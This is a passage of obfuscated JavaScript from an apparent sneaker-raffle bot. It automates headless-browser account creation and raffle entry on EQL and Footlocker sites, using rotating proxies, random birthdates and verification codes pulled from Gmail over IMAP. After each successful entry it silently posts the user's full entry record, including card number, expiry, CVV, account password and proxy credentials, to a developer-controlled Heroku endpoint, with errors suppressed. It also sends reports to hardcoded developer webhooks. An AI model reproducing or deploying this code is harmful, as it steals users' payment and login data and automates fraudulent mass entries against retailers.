                        if (_0x5f423c[_0x2128e2]['Email'] == '' || _0x5f423c[_0x2128e2]['FirstName'] == '' || _0x5f423c[_0x2128e2]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5f423c[_0x2128e2]['Password'] == '' && (_0x5f423c[_0x2128e2]['Password'] = 'JRaffles23!');
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x5a1af1 = _0x2d5992[_0x2128e2]['split'](':');
                        else
                            var _0x3c0e91 = Math['round'](Math['random']() * (_0x2d5992['length'] - 0x1)), _0x5a1af1 = _0x2d5992[_0x3c0e91]['split'](':');
                        var _0x52f10a;
                        try {
                            _0x52f10a = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5a1af1[0x0] + ':' + _0x5a1af1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x52f10a = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5a1af1[0x0] + ':' + _0x5a1af1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1c3abc = await _0x52f10a['newPage']();
                            await _0x1c3abc['authenticate']({
                                'username': '' + _0x5a1af1[0x2],
                                'password': '' + _0x5a1af1[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1c3abc['setRequestInterception'](!![]), _0x1c3abc['on']('request', _0x50cce4 => {
                                _0x50cce4['resourceType']() === 'image' || _0x50cce4['resourceType']() === 'font' || _0x50cce4['resourceType']() === 'media' ? _0x50cce4['abort']() : _0x50cce4['continue']();
                            });
                            try {
                                await _0x1c3abc['goto']('' + _0x43b2be);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x73bf2c(0x3e8), await _0x1c3abc['waitForSelector']('#email'), await _0x1c3abc['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x73bf2c(0x3e8);
                            try {
                                _0x5f423c[_0x2128e2]['Url']['includes']('en-GB') ? await _0x1c3abc['click']('li[data-value=\x22UK\x20' + _0x5f423c[_0x2128e2]['Size'] + '\x20/\x20US\x20' + (Number(_0x5f423c[_0x2128e2]['Size']) + 0x1) + '\x22]') : await _0x1c3abc['click']('li[data-value=\x22EU\x20' + _0x5f423c[_0x2128e2]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x5f423c[_0x2128e2]['Size']);
                            }
                            await _0x73bf2c(0x6a4), await _0x1c3abc['type']('#email', '' + _0x5f423c[_0x2128e2]['Email']), await _0x73bf2c(0x352), await _0x1c3abc['waitForSelector']('#password'), await _0x1c3abc['type']('#password', '' + _0x5f423c[_0x2128e2]['Password']), await _0x73bf2c(0x352), await _0x1c3abc['type']('#phone', '' + _0x5f423c[_0x2128e2]['Phone']), await _0x73bf2c(0x352);
                            const _0xc06f98 = await _0x1c3abc['$']('#title\x20>\x20label');
                            await _0x73bf2c(0x12c);
                            _0xc06f98 && await _0xc06f98['click']();
                            await _0x1c3abc['type']('#firstName', '' + _0x5f423c[_0x2128e2]['FirstName']), await _0x73bf2c(0x352), await _0x1c3abc['type']('#lastName', '' + _0x5f423c[_0x2128e2]['LastName']), await _0x73bf2c(0x352);
                            _0x5f423c[_0x2128e2]['Url']['includes']('footlocker.de') ? await _0x1c3abc['type']('#birthdate', _0x52c272(0xa, 0x1c) + '.' + _0x52c272(0xa, 0xc) + '.' + _0x52c272(0x7c6, 0x7d3)) : await _0x1c3abc['type']('#birthdate', _0x52c272(0xa, 0x1c) + '-' + _0x52c272(0xa, 0xc) + '-' + _0x52c272(0x7c6, 0x7d3));
                            await _0x73bf2c(0x352), await _0x1c3abc['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x5f423c[_0x2128e2]['Url']['includes']('en-GB') && await _0x1c3abc['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x73bf2c(0x1f4), await _0x73bf2c(0x5dc);
                            if (!_0x43b2be['includes']('footlocker'))
                                try {
                                    await _0x1c3abc['click']('#country');
                                    const _0x3df104 = await _0x1c3abc['$']('li[data-value=\x22' + _0x5f423c[_0x2128e2]['Country'] + '\x22]');
                                    await _0x3df104['click'](), await _0x3df104['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x73bf2c(0x3e8);
                            if (!_0x5f423c[_0x2128e2]['Url']['includes']('en-GB')) {
                                await _0x1c3abc['click']('#stateAutocomplete'), await _0x73bf2c(0x1f4);
                                try {
                                    const _0x23960e = await _0x1c3abc['$x']('//li[text()=\x22' + _0x5f423c[_0x2128e2]['State'] + '\x22]');
                                    await _0x23960e[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x73bf2c(0x3e8), await _0x73bf2c(0x1f4), await _0x1c3abc['type']('#address1', _0x5f423c[_0x2128e2]['Address1'] + '\x20' + _0x5f423c[_0x2128e2]['HouseNumber']), await _0x73bf2c(0x1f4), await _0x1c3abc['type']('#address2', '' + _0x5f423c[_0x2128e2]['Address2']), await _0x73bf2c(0x1f4), await _0x1c3abc['type']('#city', '' + _0x5f423c[_0x2128e2]['City']), await _0x73bf2c(0x1f4), await _0x1c3abc['type']('#postcode', '' + _0x5f423c[_0x2128e2]['Zip']), await _0x73bf2c(0x3e8), await _0x1c3abc['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x73bf2c(0x3e8), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x2ffa65 = await _0x1c3abc['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2ffa65 && (await _0x1c3abc['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1c3abc['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1c3abc['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x73bf2c(0x4b0), await _0x1c3abc['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x73bf2c(0x1f4), await _0x1c3abc['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CardNumber']), await _0x73bf2c(0x320), await _0x1c3abc['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1c3abc['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1c3abc['keyboard']['type']('' + _0x5f423c[_0x2128e2]['ExpiryDate']), await _0x73bf2c(0x4b0), await _0x1c3abc['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1c3abc['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1c3abc['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CVV']), await _0x73bf2c(0x226), await _0x1c3abc['type']('input[name=\x22postalCode\x22]', '' + _0x5f423c[_0x2128e2]['Zip']), await _0x73bf2c(0x226));
                            const _0x426424 = await _0x1c3abc['$']('.__PrivateStripeElement');
                            _0x426424 && (await _0x73bf2c(0x1f4), await _0x1c3abc['click']('.__PrivateStripeElement'), await _0x1c3abc['click']('.__PrivateStripeElement'), await _0x1c3abc['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CardNumber']), await _0x1c3abc['keyboard']['type']('' + _0x5f423c[_0x2128e2]['ExpiryDate']), await _0x1c3abc['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CVV']));
                            await _0x73bf2c(0x226), await _0x1c3abc['click']('#paymentConsent'), await _0x73bf2c(0x226), await _0x1c3abc['click']('#termsConsent'), await _0x73bf2c(0x2bc), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1c3abc['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x73bf2c(0x2710);
                            try {
                                await _0x1c3abc['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x73bf2c(0xbb8), await _0x1c3abc['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x39583b => _0x39583b['click']()), await _0x1c3abc['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x193d29 => _0x193d29['click']());
                            } catch {
                            }
                            try {
                                await _0x1c3abc['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x46ebc5 = await _0x1c3abc['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x46ebc5) {
                                    _0x57b36f['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5f423c[_0x2128e2]['Email'] + ',' + _0x5f423c[_0x2128e2]['Password'] + ',' + _0x5f423c[_0x2128e2]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x1ccb75() {
                                var _0x2dbbff, _0x1e28fa = ![];
                                for (var _0x6b5850 = 0x0; _0x6b5850 < 0x18; _0x6b5850++) {
                                    async function _0x4ff6eb() {
                                        var _0x413f18 = new _0x10db71({
                                            'user': _0x1d78d4['masterMail'],
                                            'password': _0x1d78d4['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x54114e(_0x1673fd) {
                                            _0x413f18['openBox']('INBOX', ![], _0x1673fd);
                                        }
                                        _0x413f18['once']('ready', function () {
                                            console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x54114e(function (_0x4bb283, _0x44bfdf) {
                                                console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4bb283)
                                                    throw _0x4bb283;
                                                _0x413f18['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x1abb07, _0xd9a2c9) {
                                                    if (!_0xd9a2c9 || !_0xd9a2c9['length'])
                                                        console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x413f18['end']();
                                                    else {
                                                        var _0x3f0c52 = _0x413f18['seq']['fetch'](_0xd9a2c9, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x3f0c52['on']('message', function (_0x912eeb, _0x87592b) {
                                                            var _0x4a6156 = '(#' + _0x87592b + ')\x20';
                                                            _0x912eeb['on']('body', function (_0x1e5970, _0x43ecbe) {
                                                                _0xd18e10(_0x1e5970, (_0x3c0588, _0x811da8) => {
                                                                    if (_0x811da8['subject']['includes']('code')) {
                                                                        const _0x3d9732 = _0x811da8['text']['split']('\x0a\x0a')[0x3], _0x2b9aeb = _0x3d9732['split']('\x0a')[0x1];
                                                                        _0x2dbbff = _0x2b9aeb;
                                                                    }
                                                                });
                                                            }), _0x912eeb['once']('end', function () {
                                                            });
                                                        }), _0x3f0c52['once']('error', function (_0xfb1d0f) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x3f0c52['once']('end', function () {
                                                            _0x413f18['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x413f18['once']('error', function (_0x18f83e) {
                                            console['log'](_0x11085b['red'](_0x18f83e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1e28fa = !![];
                                        }), _0x413f18['once']('end', async function () {
                                        }), _0x413f18['connect']();
                                    }
                                    _0x4ff6eb(), await _0x73bf2c(0x1388);
                                    if (_0x2dbbff)
                                        return _0x2dbbff;
                                    if (_0x1e28fa)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x6b5850 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x1ccb75(), await _0x73bf2c(0x1f4), await _0x1c3abc['type']('#code', '' + code), await _0x73bf2c(0x3e8), await _0x1c3abc['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x240026 => _0x240026['click']()), await _0x1c3abc['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x1c3abc['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x5f423c[_0x2128e2]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x57b36f['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5f423c[_0x2128e2]['Email'] + ',' + _0x5f423c[_0x2128e2]['Password'] + ',' + _0x5f423c[_0x2128e2]['Phone']), _0x47cb76 = 'no', _0x5584d0(_0x5f423c[_0x2128e2], _0x38fd2f);
                            var _0x32c226 = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'dev', ![]), _0x7eb5cc = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'pub', ![]);
                            let _0x4f0ecf = _0x5f423c[_0x2128e2];
                            try {
                                prxdata = {
                                    'username': _0x5c7ae6['replace']('#', ''),
                                    'module': _0x38fd2f['name'],
                                    'entrydata': JSON['stringify'](_0x4f0ecf),
                                    'proxy': '' + _0x2d5992[_0x2128e2]
                                };
                                var _0x3018ef = JSON['stringify'](prxdata);
                                let _0x4ae8f1 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x3018ef, _0x4ae8f1);
                            } catch (_0x20e581) {
                            }
                            const _0x1198c7 = {
                                'succesDEVMSG': { 'embeds': [_0x32c226] },
                                'succesPUBMSG': { 'embeds': [_0x7eb5cc] }
                            };
                            try {
                                _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x1198c7['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x1198c7['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x1198c7['succesPUBMSG']);
                            } catch (_0x44f8d9) {
                                console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x44f8d9));
                            }
                        } catch (_0x171916) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20' + _0x171916)), _0x3b7e01 = '' + _0x171916;
                            var _0x1304b0 = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'dev', !![], _0x3b7e01), _0x32c226 = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'dev', ![]), _0x7eb5cc = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'pub', ![]);
                            const _0x40db38 = {
                                'succesDEVMSG': { 'embeds': [_0x32c226] },
                                'succesPUBMSG': { 'embeds': [_0x7eb5cc] }
                            };
                            _0x40db38['errorDEV'] = { 'embeds': [_0x1304b0] };
                            _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x40db38['errorDEV']);
                            await _0x5cd94d(_0xfda3c6, _0x40db38['errorDEV']);
                            if (!_0x47cb76 == 'no')
                                _0x47cb76 = 'yes';
                        } finally {
                            _0x52f10a && _0x52f10a['close']();
                            if (_0x47cb76 == 'yes' && _0x23a490 != 0x5) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x23a490 + '\x20/\x205)')), _0x2128e2 = _0x2128e2 - 0x1, _0x23a490 = _0x23a490 + 0x1;
                                continue;
                            }
                            _0x47cb76 == 'yes' && _0x23a490 >= 0x5 && (_0x3fe3d2(_0x5f423c[_0x2128e2], _0x38fd2f), _0x47cb76 = 'no', _0x23a490 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    } else {
                        const _0x418813 = '' + _0x5f423c[_0x2128e2]['Url'];
                        if (_0x47cb76 != 'yes')
                            var _0x47cb76 = '', _0x23a490 = 0x0;
                        if (_0x5f423c[_0x2128e2]['Email'] == '' || _0x5f423c[_0x2128e2]['FirstName'] == '' || _0x5f423c[_0x2128e2]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5f423c[_0x2128e2]['Password'] == '' && (_0x5f423c[_0x2128e2]['Password'] = 'JRaffles23!');
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x5a1af1 = _0x2d5992[_0x2128e2]['split'](':');
                        else
                            var _0x3c0e91 = Math['round'](Math['random']() * (_0x2d5992['length'] - 0x1)), _0x5a1af1 = _0x2d5992[_0x3c0e91]['split'](':');
                        var _0x52f10a;
                        try {
                            _0x52f10a = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5a1af1[0x0] + ':' + _0x5a1af1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x52f10a = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5a1af1[0x0] + ':' + _0x5a1af1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x113230 = await _0x52f10a['newPage']();
                            await _0x113230['authenticate']({
                                'username': '' + _0x5a1af1[0x2],
                                'password': '' + _0x5a1af1[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x113230['setRequestInterception'](!![]), _0x113230['on']('request', _0x127baf => {
                                _0x127baf['resourceType']() === 'image' || _0x127baf['resourceType']() === 'font' || _0x127baf['resourceType']() === 'media' ? _0x127baf['abort']() : _0x127baf['continue']();
                            }), await _0x113230['goto'](_0x418813), await _0x113230['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x113230['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x73bf2c(0x7d0), await _0x113230['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x113230['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x73bf2c(0x3e8), await _0x113230['waitForSelector']('#email'), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x113230['type']('#email', '' + _0x5f423c[_0x2128e2]['Email']), await _0x73bf2c(0x352), await _0x113230['waitForSelector']('#password'), await _0x113230['type']('#password', '' + _0x5f423c[_0x2128e2]['Password']), await _0x73bf2c(0x352), await _0x113230['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x73bf2c(0x1388);
                            if (!_0x5f423c[_0x2128e2]['Url']['includes']('footlocker'))
                                await _0x113230['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x113230['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x5584d0(_0x5f423c[_0x2128e2], _0x38fd2f), _0x47cb76 = 'no';
                                continue;
                            }
                            await _0x113230['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x73bf2c(0x3e8);
                            try {
                                _0x5f423c[_0x2128e2]['Url']['includes']('en-GB') ? await _0x113230['click']('li[data-value=\x22UK\x20' + _0x5f423c[_0x2128e2]['Size'] + '\x20/\x20US\x20' + (Number(_0x5f423c[_0x2128e2]['Size']) + 0x1) + '\x22]') : await _0x113230['click']('li[data-value=\x22EU\x20' + _0x5f423c[_0x2128e2]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x5f423c[_0x2128e2]['Size']);
                            }
                            await _0x73bf2c(0x1f4);
                            const _0x238674 = await _0x113230['$']('#title\x20>\x20label');
                            await _0x73bf2c(0x12c);
                            _0x238674 && await _0x238674['click']();
                            await _0x113230['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x113230['focus']('#postcode'), await _0x113230['keyboard']['down']('Control'), await _0x113230['keyboard']['press']('A'), await _0x113230['keyboard']['up']('Control'), await _0x113230['keyboard']['press']('Backspace'), await _0x113230['keyboard']['type'](_0x5f423c[_0x2128e2]['Zip']), await _0x73bf2c(0x60e), await _0x113230['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x73bf2c(0x3e8), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x73bf2c(0x1f4);
                            const _0x2b799f = await _0x113230['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2b799f && (await _0x113230['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x113230['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x113230['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x73bf2c(0x4b0), await _0x113230['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x73bf2c(0x1f4), await _0x113230['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CardNumber']), await _0x73bf2c(0x320), await _0x113230['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x113230['keyboard']['type']('' + _0x5f423c[_0x2128e2]['ExpiryDate']), await _0x73bf2c(0x4b0), await _0x113230['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x113230['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CVV']), await _0x73bf2c(0x226), await _0x113230['type']('input[name=\x22postalCode\x22]', '' + _0x5f423c[_0x2128e2]['Zip']), await _0x73bf2c(0x226));
                            const _0x1423d4 = await _0x113230['$']('.__PrivateStripeElement');
                            _0x1423d4 && (await _0x113230['click']('#billingName'), await _0x113230['click']('#billingName'), await _0x113230['type']('#billingName', '' + _0x5f423c[_0x2128e2]['NameOnCard']), await _0x73bf2c(0x1f4), await _0x113230['click']('.__PrivateStripeElement'), await _0x113230['click']('.__PrivateStripeElement'), await _0x113230['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CardNumber']), await _0x113230['keyboard']['type']('' + _0x5f423c[_0x2128e2]['ExpiryDate']), await _0x113230['keyboard']['type']('' + _0x5f423c[_0x2128e2]['CVV']));
                            await _0x73bf2c(0x226), await _0x113230['click']('#paymentConsent'), await _0x73bf2c(0x226), await _0x113230['click']('#termsConsent'), await _0x73bf2c(0x2bc), console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x113230['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x73bf2c(0x2710);
                            try {
                                await _0x113230['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x73bf2c(0xbb8), await _0x113230['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x258b06 => _0x258b06['click']()), await _0x113230['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x467383 => _0x467383['click']());
                            } catch {
                            }
                            try {
                                await _0x113230['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x5584d0(_0x5f423c[_0x2128e2], _0x38fd2f);
                            var _0x32c226 = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'dev', ![]), _0x7eb5cc = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'pub', ![]);
                            let _0x12bff0 = _0x5f423c[_0x2128e2];
                            try {
                                prxdata = {
                                    'username': _0x5c7ae6['replace']('#', ''),
                                    'module': _0x38fd2f['name'],
                                    'entrydata': JSON['stringify'](_0x12bff0),
                                    'proxy': '' + _0x2d5992[_0x2128e2]
                                };
                                var _0x3018ef = JSON['stringify'](prxdata);
                                let _0x55260a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x3018ef, _0x55260a);
                            } catch (_0x227ce5) {
                            }
                            const _0x5943f3 = {
                                'succesDEVMSG': { 'embeds': [_0x32c226] },
                                'succesPUBMSG': { 'embeds': [_0x7eb5cc] }
                            };
                            try {
